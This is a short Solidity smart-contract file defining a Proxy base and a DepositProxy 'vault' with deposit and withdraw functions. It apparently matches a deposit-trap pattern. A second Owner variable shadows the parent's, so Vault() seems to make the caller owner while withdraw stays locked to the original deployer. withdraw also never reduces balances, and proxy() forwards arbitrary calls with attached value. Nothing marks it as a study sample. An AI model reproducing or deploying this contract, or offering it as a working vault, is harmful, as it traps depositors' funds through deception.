pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            depositRecursive(msg.value);
        }
    }

    function depositRecursive(uint256 amount) internal {
        if (amount > 0.5 ether) {
            Deposits[msg.sender] += amount;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
        }
    }
}